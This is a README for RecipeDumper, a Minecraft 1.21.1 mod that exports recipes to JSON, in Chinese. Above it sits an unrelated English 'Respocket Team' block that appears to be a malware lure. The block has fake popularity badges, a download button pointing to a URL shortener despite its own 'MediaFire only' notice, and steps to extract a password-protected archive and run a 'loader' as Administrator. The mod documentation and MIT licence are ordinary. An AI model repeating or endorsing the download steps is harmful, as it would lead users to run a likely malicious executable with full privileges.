<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 用法

### 命令

在游戏里执行（单人游戏需要开启作弊）：

```
/dumprecipe <modid>
```

例如 `/dumprecipe armor_addon`。结果写到：

```
<游戏目录>/export/dump_recipes_<modid>.json
```

modid 有 Tab 补全。

### 无人值守

设环境变量后，服务端启动完成时会自动导出一次，方便脚本化 / CI：

```bash
RECIPEDUMPER_AUTO=armor_addon ./gradlew runServer
```

不设就什么都不发生。

---

## 导出格式

```json
{
  "recipes": [
    {
      "type": "crafting_shaped",
      "name": "armor_addon:iron_heavy_helmet",
      "input": {
        "1": { "item": "minecraft:iron_block", "count": 1 },
        "2": { "tag": "minecraft:wool", "count": 1 }
      },
      "output": {
        "1": { "item": "armor_addon:iron_heavy_helmet", "count": 1 }
      }
    }
  ],
  "error": []
}
```

`error` 里是导出失败的配方 id；单条失败不会中断整体。

### 槽位约定

| 配方类型 | `type` | 输入槽位 |
| --- | --- | --- |
| **有序合成** | `crafting_shaped` | 按 3×3 网格：左上角 1、右下角 9，即 `y * 3 + x + 1` |
| **无序合成** | `crafting_shapeless` | 从 1 顺次编号 |
| **锻造** | `smithing` | **模板 = 1、基底 = 2、添加物 = 3** |
| **烧炼** | `minecraft:smelting` 等 | 1，另带 `experience` / `cookTime` |
| **切石** | `minecraft:stonecutting` | 1 |

输出一律用槽位 1。

> **关于锻造的槽位顺序**：按 **1.21 的顺序**排，也就是 MC百科「锻造台（1.20+）」
> 界面上从左上到右下依次是 **模板 → 基底 → 添加物**，对应槽位 **1 / 2 / 3**。
>
> 1.16 时代的旧格式是「基底 1、添加物 2、没有模板」。这里**不再迁就那个顺序**，
> 因为 1.20 之后配方本身的字段顺序就是 `template` / `base` / `addition`，
> 而且百科更新后的锻造台模板是按新顺序画的。

> **关于 `type` 的命名空间**：有序 / 无序合成用原版写死的无命名空间名字
> （`crafting_shaped` / `crafting_shapeless`），其余用 `RecipeType` 的注册名（带命名空间）。
> 这个不一致是原版就有的，这里刻意不改，以免百科那边认不出来。

---

## 和原版的差异

| | 原版 (1.16~1.20.6) | 这里 (1.21.1) |
| --- | --- | --- |
| 导出框架 | 注解扫描 + 反射注册各类型的 dumper | 直接在代码里按类型分派 |
| 配方 API | `IRecipe` / `getRegistryName` / NBT | `Recipe` / `ResourceLocation` / 数据组件 |
| 锻造 | base=1、addition=2 | **template=1、base=2、addition=3**（1.21 顺序） |
| 烧炼 | `getCookTime()` | `getCookingTime()` |
| 自动导出 | 无 | 支持 `RECIPEDUMPER_AUTO` 环境变量 |

**JSON 结构、槽位编号、`type` 命名都保持一致。**

### 关于 AccessTransformer

`SmithingTransformRecipe` 的 `template` / `base` / `addition` 三个字段是**包级私有**的，
跨包读不到，所以用了一个 AccessTransformer：

```
src/main/resources/META-INF/accesstransformer.cfg
```

ModDevGradle 用默认路径时不需要额外配置；`build.gradle` 里开了
`validateAccessTransformers = true`，写错目标会直接报错而不是静默失效。

---

## 构建

```bash
./gradlew build
```

产物在 `build/libs/RecipeDumper-<version>.jar`。

## 验证

`tools/verify_dump.py` 做交叉验证：**从模组源码的配方文件推导期望值**，
和**游戏运行时导出的实际值**逐条对比（类型、槽位、输入、输出、数量）。

```bash
python tools/verify_dump.py run/export/dump_recipes_armor_addon.json
```

用它跑「盔甲附加」1.3.4 的 65 条配方，结果是 **65 条全部一致，0 不符 / 0 缺失 / 0 多余**。

---


---

MIT License

Copyright (c) 2021 youyihj
Copyright (c) 2026 2925539099

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
